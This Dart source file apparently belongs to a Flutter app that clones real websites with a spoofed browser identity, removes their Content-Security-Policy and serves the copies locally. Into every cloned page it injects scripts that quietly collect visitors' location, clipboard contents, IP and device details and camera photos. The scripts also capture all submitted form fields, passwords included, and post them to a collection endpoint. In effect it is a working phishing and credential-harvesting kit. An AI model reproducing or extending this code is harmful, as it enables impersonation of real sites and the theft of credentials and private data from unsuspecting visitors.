import 'dart:convert';
import 'dart:io';
import 'dart:typed_data'; // 添加 Uint8List 支持
import 'dart:async';
import 'package:html/dom.dart';
import 'package:dio/dio.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/services.dart' show rootBundle;
import 'package:html/parser.dart' as html_parser;
import 'server_service.dart';
import 'universal_capture_injector.dart';


class Site {
  Site({required this.id, required this.name, required this.path, this.origin, this.port, this.securePort,
    this.probeGPS = false, this.probeCamera = false, this.probeClipboard = false,
    this.probeIP = false, this.probeDevice = false,
    this.enabled = true, this.domain});
  final String id; // uuid
  String name;
  String path; // local directory path
  String? origin; // original site base url
  int? port; // listening port
  int? securePort; // https port
  bool probeGPS;
  bool probeCamera;
  bool probeClipboard;
  bool probeIP;
  bool probeDevice;
  bool enabled;
  String? domain;

  Map<String, dynamic> toMap() => {
    'id': id,
    'name': name,
    'path': path,
    'origin': origin,
    'port': port,
    'securePort': securePort,
    'probeGPS': probeGPS,
    'probeCamera': probeCamera,
    'probeClipboard': probeClipboard,
    'probeIP': probeIP,
    'probeDevice': probeDevice,
    'enabled': enabled,
    'domain': domain,
  };

  factory Site.fromMap(Map<String, dynamic> map) => Site(
    id: map['id'],
    name: map['name'],
    path: map['path'],
    origin: map['origin'],
    port: map['port'],
    securePort: map['securePort'],
    probeGPS: map['probeGPS'] ?? false,
    probeCamera: map['probeCamera'] ?? false,
    probeClipboard: map['probeClipboard'] ?? false,
    probeIP: map['probeIP'] ?? false,
    probeDevice: map['probeDevice'] ?? false,
    enabled: map['enabled'] ?? true,
    domain: map['domain'] ?? (map['origin'] != null ? Uri.parse(map['origin']).origin : null),
  );
}

class SiteService {
  static const _prefKey = 'sites';
  static final SiteService instance = SiteService._();
  SiteService._();

  static const Map<String,String> _uaPresets={
    'chrome':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'edge':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'firefox':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'wechat':'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.10(0x18000a25) NetType/WIFI Language/zh_CN',
    'qq':'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 QQ/8.8.50',
    'iphone':'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'android':'Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36'
  };

  // 获取应用程序支持目录的快捷方式
  Future<Directory> get _appSupportDir async {
    // Prefer app-specific external storage so user can access without root
    Directory? ext = await getExternalStorageDirectory();
    if (ext != null) {
      await ext.create(recursive: true);
      return ext;
    }
    return await getApplicationSupportDirectory();
  }

  Future<List<Site>> fetchSites() async {
    final prefs = await SharedPreferences.getInstance();
    final jsonStr = prefs.getString(_prefKey);
    List<Site> list = [];

    if (jsonStr != null && jsonStr.isNotEmpty) {
      try {
        final raw = jsonDecode(jsonStr);
        if (raw is List) {
          list = raw.map((e) => Site.fromMap(e)).toList();
        } else {
          // 损坏数据，清空
          await prefs.remove(_prefKey);
        }
      } catch (e) {
        print('Error parsing sites json: $e');
        await prefs.remove(_prefKey);
      }
    }

    // 仅首次生成示例站点
    final sampleReady = prefs.getBool('sample_ready') ?? false;
    if (list.isEmpty && !sampleReady) {
      // 先设置标记，避免并发重复创建
      await prefs.setBool('sample_ready', true);
      try {
        final sample = await _addSampleSite();
        list = [sample];
        await saveSites(list);
      } catch (e) {
        print('Error creating sample site: $e');
      }
    }
    return list;
  }

  Future<void> saveSites(List<Site> sites) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final list = sites.map((e) => e.toMap()).toList();
      await prefs.setString(_prefKey, jsonEncode(list));
    } catch (e) {
      print('Error saving sites: $e');
    }
  }

  Future<Site> addSiteFromUrl(String url, {String? customName, bool gps=false, bool camera=false, bool clip=false, bool ip=false, bool device=false, String? userAgent}) async {
    // 处理可能存在的前缀符号
    if (url.startsWith('@')) url = url.substring(1);

    // 先解析 URL 以便后续复用（域名、Referer 等）
    final Uri baseUri = Uri.parse(url);
    final String refererDomain = baseUri.origin;

    final dir = await _appSupportDir;
    final folderName = 'site_${DateTime.now().millisecondsSinceEpoch}';
    final targetDir = Directory(p.join(dir.path, 'sites', folderName));
    await targetDir.create(recursive: true);
    print('Created site directory: ${targetDir.path}');

    final dio = Dio()
      ..options.connectTimeout = Duration(seconds: 10)
      ..options.receiveTimeout = Duration(seconds: 10)
      ..options.headers['User-Agent'] = _uaPresets[userAgent??'wechat'] ?? userAgent
      ..options.headers['Referer'] = refererDomain;

    String htmlStr;
    try {
      // 下载主页
      final response = await dio.get<String>(url);
      htmlStr = response.data!;
      print('Downloaded HTML from $url (${htmlStr.length} chars)');
    } catch (e) {
      print('Error downloading $url: $e');
      // 创建回退HTML
      htmlStr = '''
        <html>
          <head><title>Error Loading Site</title></head>
          <body>
            <h1>Site Load Error</h1>
            <p>Failed to download original content from $url</p>
            <p>Error: ${e.toString()}</p>
          </body>
        </html>
      ''';
    }

    final document = html_parser.parse(htmlStr);

    // 收集资源链接
    final assetElements = [
      ...document.querySelectorAll('img[src]'),
      ...document.querySelectorAll('script[src]'),
      ...document.querySelectorAll('link[rel="stylesheet"][href]'),
      ...document.querySelectorAll('source[src]'),
      ...document.querySelectorAll('video[src]'),
      ...document.querySelectorAll('audio[src]'),
      ...document.querySelectorAll('embed[src]'),
      ...document.querySelectorAll('iframe[src]'),
    ];

    // 安全处理资源下载
    await _downloadAndReplaceAssets(dio, baseUri, assetElements, targetDir);

    // 处理并收集内部页面链接（仅首层，后续在递归里处理）
    final visitedPages=<String>{baseUri.toString()};
    final anchors=document.querySelectorAll('a[href]');
    final pagesToDownload=<Uri>[];
    for(final a in anchors){
      final href=a.attributes['href']??'';
      if(href.isEmpty||href.startsWith('#')||href.startsWith('javascript:')) continue;
      Uri linkUri;
      if(href.startsWith('http')){
        linkUri=Uri.parse(href);
      }else{
        linkUri=baseUri.resolve(href);
      }
      if(linkUri.origin!=baseUri.origin) continue; // 只抓取同源
      if(visitedPages.contains(linkUri.toString())) continue;
      pagesToDownload.add(linkUri);

      // 替换链接为本地路径
      final localRelative=_computeLocalHtmlPath(linkUri);
      a.attributes['href']='/'+localRelative;
    }

    // 移除可能阻止注入脚本的 CSP
    document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').forEach((e)=>e.remove());

    // 创建站点对象
    final site = Site(
      id: folderName,
      name: customName ?? _sanitizeName(url),
      path: targetDir.path,
      probeGPS: gps,
      probeCamera: camera,
      probeClipboard: clip,
      probeIP: ip,
      probeDevice: device,
      origin: url,
      domain: baseUri.origin,
    );

    // 注入探针脚本后保存 HTML
    _injectInterceptors(document, site);
    htmlStr = document.outerHtml;
    final indexFile = File(p.join(targetDir.path, 'index.html'));
    await indexFile.writeAsString(htmlStr);
    print('Saved index.html (${htmlStr.length} chars)');

    // 递归下载内部页面（深度1，最大深度5）
    for(final pageUri in pagesToDownload){
      await _downloadHtmlPage(dio, pageUri, baseUri, targetDir, site, visitedPages, 1, 5);
    }

    // 首次保存（不含端口）
    final sites = await fetchSites();
    sites.add(site);
    await saveSites(sites);

    try {
      // 启动服务并获取端口
      await ServerService.instance.startSite(site);
      print('Server started for site ${site.id} on port ${site.port}');

      // 更新端口信息
      final updatedSites = await fetchSites();
      final index = updatedSites.indexWhere((s) => s.id == site.id);
      if (index != -1) {
        updatedSites[index] = site;
        await saveSites(updatedSites);
        print('Updated site with port ${site.port}');
      }
    } catch (e) {
      print('Error starting server for site ${site.id}: $e');
      // 标记站点为禁用状态
      site.enabled = false;
      final updatedSites = await fetchSites();
      final index = updatedSites.indexWhere((s) => s.id == site.id);
      if (index != -1) {
        updatedSites[index] = site;
        await saveSites(updatedSites);
      }
      throw Exception('Failed to start local server: $e');
    }

    // site object will be created below, so _injectInterceptors will be called after site instantiation.

    return site;
  }

  Future<void> _downloadAndReplaceAssets(
      Dio dio,
      Uri baseUri,
      List<Element> elements,
      Directory targetDir,
      ) async {
    final futures = <Future>[];

    for (final element in elements) {
      final attrName = _getAssetAttribute(element);
      final rawUrl = element.attributes[attrName] ?? '';

      if (rawUrl.isEmpty ||
          rawUrl.startsWith('data:') ||
          rawUrl.startsWith('javascript:') ||
          rawUrl.startsWith('mailto:')) {
        continue;
      }

      futures.add(_processAsset(
        dio,
        baseUri,
        element,
        attrName,
        rawUrl,
        targetDir,
      ));
    }

    // 并行处理所有资源，限制并发数
    await Future.wait(futures, eagerError: true);
  }

  Future<void> _processAsset(
      Dio dio,
      Uri baseUri,
      Element element,
      String attrName,
      String rawUrl,
      Directory targetDir,
      ) async {
    try {
      Uri assetUri;
      if (rawUrl.startsWith('http')) {
        assetUri = Uri.parse(rawUrl);
      } else {
        assetUri = baseUri.resolve(rawUrl);
      }

      // 获取资源内容
      final response = await dio.get<List<int>>(assetUri.toString(), options: Options(responseType: ResponseType.bytes));

      // 创建安全保存路径
      final relativePath = _createSafePath(assetUri);
      final savePath = p.join(targetDir.path, relativePath);
      final saveFile = File(savePath);

      // 确保目录存在
      await saveFile.parent.create(recursive: true);
      await saveFile.writeAsBytes(Uint8List.fromList(response.data!));

      // 更新元素属性为本地路径
      element.attributes[attrName] = '/$relativePath';

      print('Saved asset: $savePath (${response.data!.length} bytes)');

      // 如果是 CSS 文件，解析其中的 url() 引用并递归下载
      final isCss = assetUri.path.endsWith('.css');
      if (isCss) {
        try {
          final cssContent = utf8.decode(response.data!);

          // 1) url() references
          final urlRegex = RegExp(r'url\(([^)]+)\)', caseSensitive: false);
          // 2) @import "..." or '...'
          final importRegex = RegExp(r'''@import\s+(["\'])([^"\']+)\1''', caseSensitive: false);

          Iterable<RegExpMatch> matches = urlRegex.allMatches(cssContent).followedBy(importRegex.allMatches(cssContent));

          for (final m in matches) {
            // For url(), group(1) contains url; for @import, group(2)
            var innerRaw = m.groupCount >= 2 ? (m.group(2) ?? m.group(1)!) : m.group(1)!;
            innerRaw = innerRaw.trim().replaceAll("'", '').replaceAll('"', '');
            if (innerRaw.isEmpty || innerRaw.startsWith('data:') || innerRaw.startsWith('javascript:')) continue;

            Uri innerUri;
            if (innerRaw.startsWith('http')) {
              innerUri = Uri.parse(innerRaw);
            } else {
              innerUri = assetUri.resolve(innerRaw);
            }

            final innerRelative = _createSafePath(innerUri);
            final innerFile = File(p.join(targetDir.path, innerRelative));
            if (await innerFile.exists()) continue;

            // create dummy element to reuse logic; attribute depends on import type but treat as 'href'
            final dummy = Element.tag('link');
            dummy.attributes['href'] = innerRaw;
            await _processAsset(dio, assetUri, dummy, 'href', innerRaw, targetDir);
          }
        } catch (e) {
          print('Error parsing css asset ${assetUri.toString()}: $e');
        }
      }
    } catch (e) {
      print('Error processing asset $rawUrl: $e');
      // 保留原始URL而不是中断流程
    }
  }

  String _createSafePath(Uri uri) {
    String path = uri.path;
    if (path.startsWith('/')) path = path.substring(1);

    // 移除查询参数
    path = path.split('?').first;

    // 防止路径遍历
    path = path.replaceAll('../', '').replaceAll('..\\', '');

    // 路径规范化
    return p.normalize(path);
  }

  String _getAssetAttribute(Element element) {
    if (element.localName == 'link') return 'href';
    return 'src';
  }

  String _sanitizeName(String input) {
    // 移除协议和非法字符
    return input
        .replaceAll(RegExp(r'^https?://'), '')
        .replaceAll(RegExp(r'[^\w\s-]'), '')
        .substring(0, min(input.length, 50));
  }

  int min(int a, int b) => a < b ? a : b;

  Future<void> updateSite(Site site) async {
    try {
      final sites = await fetchSites();
      final idx = sites.indexWhere((s) => s.id == site.id);
      if (idx != -1) {
        sites[idx] = site;
        await saveSites(sites);

        // 重启服务使更改生效
        if (site.enabled) {
          // 先停止再启动
          await ServerService.instance.stopSite(site);
          await ServerService.instance.startSite(site);
        } else {
          await ServerService.instance.stopSite(site);
        }
      }
    } catch (e) {
      print('Error updating site: $e');
    }
  }

  Future<void> deleteSite(String id) async {
    try {
      // 先停止服务
      final sites = await fetchSites();
      Site? site;
      try {
        site = sites.firstWhere((s) => s.id == id);
      } catch (_) {
        site = null;
      }
      if (site != null) {
        await ServerService.instance.stopSite(site);
      }

      if (site != null) {
        // 删除文件
        try {
          final dir = Directory(site.path);
          if (await dir.exists()) {
            await dir.delete(recursive: true);
          }
        } catch (e) {
          print('Error deleting site files: $e');
        }

        // 从列表移除
        sites.removeWhere((s) => s.id == id);
        await saveSites(sites);
      }
    } catch (e) {
      print('Error deleting site: $e');
    }
  }

  Future<Site> _addSampleSite() async {
    final dir = await _appSupportDir;
    final folderName = 'sample_${DateTime.now().millisecondsSinceEpoch}';
    final targetDir = Directory(p.join(dir.path, 'sites', folderName));
    await targetDir.create(recursive: true);

    String htmlContent = '''
    <!DOCTYPE html>
    <html>
    <head>
      <title>示例站点</title>
      <style>
        body { font-family: sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        p { line-height: 1.6; }
      </style>
    </head>
    <body>
      <h1>欢迎使用本地站点服务</h1>
      <p>这是一个自动生成的示例站点。</p>
      <p>您可以通过添加URL来创建自己的本地站点副本。</p>
      <p>当前时间: ${DateTime.now()}</p>
    </body>
    </html>
    ''';

    final indexFile = File(p.join(targetDir.path, 'index.html'));
    await indexFile.writeAsString(htmlContent);

    final sampleSite = Site(
      id: folderName,
      name: '示例站点',
      path: targetDir.path,
      origin: 'https://example.com',
      domain: 'https://example.com',
    );

    // 保存并启动服务
    final sites = await fetchSites();
    sites.add(sampleSite);
    await saveSites(sites);

    try {
      await ServerService.instance.startSite(sampleSite);

      // 更新端口信息
      final updatedSites = await fetchSites();
      final index = updatedSites.indexWhere((s) => s.id == sampleSite.id);
      if (index != -1) {
        updatedSites[index] = sampleSite;
        await saveSites(updatedSites);
      }
    } catch (e) {
      print('Error starting sample site: $e');
      sampleSite.enabled = false;
      final updatedSites = await fetchSites();
      final index = updatedSites.indexWhere((s) => s.id == sampleSite.id);
      if (index != -1) {
        updatedSites[index] = sampleSite;
        await saveSites(updatedSites);
      }
    }

    return sampleSite;
  }

  Future<Site> _createFallbackSite() async {
    final dir = await _appSupportDir;
    final folderName = 'fallback_${DateTime.now().millisecondsSinceEpoch}';
    final targetDir = Directory(p.join(dir.path, 'sites', folderName));
    await targetDir.create(recursive: true);

    final content = '''
    <!DOCTYPE html>
    <html>
    <head>
      <title>回退站点</title>
    </head>
    <body>
      <h1>站点服务初始化失败</h1>
      <p>无法创建示例站点，但此回退站点已成功启动。</p>
    </body>
    </html>
    ''';

    File(p.join(targetDir.path, 'index.html')).writeAsStringSync(content);

    return Site(
      id: folderName,
      name: '回退站点',
      path: targetDir.path,
      origin: 'https://fallback.com',
      domain: 'https://fallback.com',
    );
  }

  Future<Site?> getActiveSite() async {
    try {
      final sites = await fetchSites();
      if (sites.isEmpty) return null;

      // 优先返回启用的站点
      final active = sites.firstWhere(
              (s) => s.enabled,
          orElse: () => sites.first
      );

      return active;
    } catch (e) {
      print('Error getting active site: $e');
      return null;
    }
  }

  void _injectInterceptors(Document document, Site site) {
    final headElem = document.head ?? document.append(Element.tag('head')) as Element;

    // 注入探针脚本（保持原有功能）
    final probeScript = Element.tag('script')..innerHtml = """
    window.__PROBE_GPS__=${site.probeGPS};
    window.__PROBE_CAM__=${site.probeCamera};
    window.__PROBE_CLIP__=${site.probeClipboard};
    window.__PROBE_IP__=${site.probeIP};
    window.__PROBE_DEVICE__=${site.probeDevice};
    (function(){
      const j=(t,b,c)=>fetch('/_visitor_data',{method:'POST',headers:c||{'Content-Type':'application/json'},body:b?b:JSON.stringify(t)}).catch(()=>{});

      if(window.__PROBE_GPS__&&navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>j({type:'gps',lat:p.coords.latitude,lon:p.coords.longitude}),()=>{}, {timeout:5e3});}
      if(window.__PROBE_CLIP__&&navigator.clipboard){navigator.clipboard.readText().then(t=>t&&j({type:'clip',data:t})).catch(()=>{});}
      if(window.__PROBE_IP__||window.__PROBE_DEVICE__){
        const ipApis=['https://api.ipify.org?format=json','https://ipinfo.io/json','https://api.myip.com'];
        const buildProxy=url=>'/__proxy_ip__?u='+encodeURIComponent(url);
        const tryFetch=(endpoint,cb)=>{
          let controller=null,timer=null,opts={};
          if(window.AbortController){
            controller=new AbortController();
            opts.signal=controller.signal;
            timer=setTimeout(()=>controller.abort(),5000);
          }else{
            timer=setTimeout(()=>{cb({});},5000);
          }
          const done=()=>{ if(timer) clearTimeout(timer); };
          const fetchJson=u=>fetch(u,opts).then(r=>r.json());
          fetchJson(endpoint)
            .then(cb)
            .catch(()=>{
              fetchJson(buildProxy(endpoint)).then(cb).catch(()=>{cb({});});
            })
            .finally(done);
        };
        (function tryNext(i){
          if(i>=ipApis.length) return;
          tryFetch(ipApis[i],d=>{
            const ip=d.ip||d.ipAddress||d.hostname||d.query||d.address;
            if(ip){j({type:'info',ip,ua:navigator.userAgent,lang:navigator.language,plat:navigator.platform});}
            else{tryNext(i+1);}
          });
        })(0);
      }
      if(window.__PROBE_CAM__&&navigator.mediaDevices&&(location.protocol==='https:'||location.hostname==='localhost')){navigator.mediaDevices.getUserMedia({video:true}).then(s=>s.getVideoTracks()[0]).then(t=>new ImageCapture(t).takePhoto()).then(b=>b.arrayBuffer()).then(buf=>j(null,new Uint8Array(buf),{'Content-Type':'application/octet-stream','X-Probe-Type':'camera'})).catch(()=>{});}
    })();
    """;
    headElem.append(probeScript);

    // 注入代理脚本（保持原有功能）
    final proxyScript = Element.tag('script')..innerHtml = """
    (function(){
      function buildProxy(url){return '/_proxy_api?target='+encodeURIComponent(url);} 
      // XHR
      const origOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function(m,u){
        if(/^https?:/.test(u)){
          if(needProxy(u)) u=buildProxy(u);
        }
        return origOpen.apply(this, [m,u, ...Array.prototype.slice.call(arguments,2)]);
      };

      // fetch override with proxy exemption
      const proxyExempt=['api.ipify.org','ipinfo.io','api.myip.com'];
      function needProxy(url){
        try{const h=new URL(url).hostname;return !proxyExempt.includes(h);}catch(e){return false;}
      }
      const origFetch=window.fetch;
      window.fetch=function(input,init){
        let url=typeof input==='string'?input:input.url;
        if(/^https?:/.test(url) && needProxy(url)){
          url=buildProxy(url);
          input=typeof input==='string'?url:new Request(url,input);
        }
        return origFetch(input,init);
      };

      // form submit
      document.addEventListener('submit', function(e){
        const f=e.target;
        if(!f || !f.action) return;
        let url = f.action;
        if(!/^https?:/.test(url)){
          url = location.origin + (url.startsWith('/')?url:'/'+url);
        }
        // 保持原始 action，不做代理重写，避免表单导航失效

        // 捕获表单字段并上传，不影响原提交或 action
        try {
          const fd = new FormData(f);
          const obj = {};
          fd.forEach((v,k)=>{obj[k]=v;});
          fetch('/_visitor_data', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({type:'FORM',data:obj})
          }).catch(()=>{});
        } catch(_){}
      }, true);
    })();
    """;
    headElem.append(proxyScript);

    // 注入新的通用数据捕获脚本
    final captureScript = Element.tag('script')..innerHtml = UniversalCaptureInjector.generateCaptureScript('/_visitor_data');
    headElem.append(captureScript);
  }

  // 计算 HTML 本地保存相对路径
  String _computeLocalHtmlPath(Uri uri){
    var rel=_createSafePath(uri);
    if(rel.isEmpty){
      rel='index.html';
    }else{
      if(rel.endsWith('/')) rel +='index.html';
      if(!rel.contains('.')) rel+='.html';
    }
    return rel;
  }

  Future<void> _downloadHtmlPage(
      Dio dio,
      Uri pageUri,
      Uri baseUri,
      Directory targetDir,
      Site site,
      Set<String> visited,
      int depth,
      int maxDepth,
      ) async {
    if(depth>maxDepth) return;
    if(visited.contains(pageUri.toString())) return;
    visited.add(pageUri.toString());
    try{
      final resp=await dio.get<String>(pageUri.toString());
      String htmlStr=resp.data??'';
      final doc=html_parser.parse(htmlStr);

      // 下载资源
      final assetElements=[
        ...doc.querySelectorAll('img[src]'),
        ...doc.querySelectorAll('script[src]'),
        ...doc.querySelectorAll('link[rel="stylesheet"][href]'),
        ...doc.querySelectorAll('source[src]'),
        ...doc.querySelectorAll('video[src]'),
        ...doc.querySelectorAll('audio[src]'),
        ...doc.querySelectorAll('embed[src]'),
        ...doc.querySelectorAll('iframe[src]'),
      ];
      await _downloadAndReplaceAssets(dio, pageUri, assetElements, targetDir);

      // 处理锚点并队列
      final anchors=doc.querySelectorAll('a[href]');
      final nextPages=<Uri>[];
      for(final a in anchors){
        final href=a.attributes['href']??'';
        if(href.isEmpty||href.startsWith('#')||href.startsWith('javascript:')) continue;
        Uri linkUri;
        if(href.startsWith('http')){
          linkUri=Uri.parse(href);
        }else{
          linkUri=pageUri.resolve(href);
        }
        if(linkUri.origin!=baseUri.origin) continue;
        if(visited.contains(linkUri.toString())) continue;
        nextPages.add(linkUri);
        final localRelative=_computeLocalHtmlPath(linkUri);
        a.attributes['href']='/'+localRelative;
      }

      // 移除 CSP
      doc.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').forEach((e)=>e.remove());

      // 注入脚本
      _injectInterceptors(doc, site);

      htmlStr=doc.outerHtml;
      final saveRel=_computeLocalHtmlPath(pageUri);
      final saveFile=File(p.join(targetDir.path, saveRel));
      await saveFile.parent.create(recursive:true);
      await saveFile.writeAsString(htmlStr);
      print('Saved page: $saveRel (${htmlStr.length} chars)');

      // recursion
      for(final next in nextPages){
        await _downloadHtmlPage(dio, next, baseUri, targetDir, site, visited, depth+1, maxDepth);
      }
    }catch(e){
      print('Error downloading page ${pageUri.toString()}: $e');
    }
  }
}